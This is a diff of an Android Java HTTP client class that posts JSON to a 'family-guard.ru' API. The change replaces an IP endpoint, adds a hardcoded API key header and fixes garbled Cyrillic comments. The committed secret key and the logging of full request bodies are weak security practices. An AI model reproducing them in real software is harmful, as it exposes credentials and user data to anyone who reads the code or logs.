@@ -1,5 +1,7 @@
 package com.inet.android.request;
 
+
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
@@ -23,7 +25,7 @@ import android.content.Context;
 import com.inet.android.utils.Logging;
 
 /**
- * Сaller class is used to send requests to the server (not for files)
+ * Class for make http post request
  * @author johny homicide
  *
  */
@@ -40,16 +42,18 @@ public class Caller {
 		String data = null;
 		mContext = context;
 	
-		// Create HttpClient Рё PostHandler
+		// Create HttpClient и PostHandler
 		HttpClient httpclient = new DefaultHttpClient();
 		URI uri = null;
 		HttpPost httppost = null;
 		try {
-			uri = new URI("http://188.226.208.100/" + addition);
+			uri = new URI("http://family-guard.ru/api/" + addition);
 			Logging.doLog(LOG_TAG, uri.toASCIIString());
 			httppost = new HttpPost(uri);
 			httppost.setHeader("Accept", "application/json");
 			httppost.setHeader(HTTP.CONTENT_TYPE, "application/json");
+			httppost.setHeader("Api-Key", "0a9841923f348ebb5d171708a6f860f9");
+			
 		} catch (URISyntaxException e1) {
 			Logging.doLog(LOG_TAG, "bad in uri");
 			e1.printStackTrace();
@@ -66,7 +70,7 @@ public class Caller {
 			Logging.doLog(LOG_TAG, "doMake: " + EntityUtils.toString(httppost.getEntity()), 
 					"doMake: " + EntityUtils.toString(httppost.getEntity()));
 
-			// Р’С‹РїРѕР»РЅРёРј Р·Р°РїСЂРѕСЃ
+			// Выполним запрос
 			HttpResponse response = httpclient.execute(httppost);
 
 			if (response != null) {
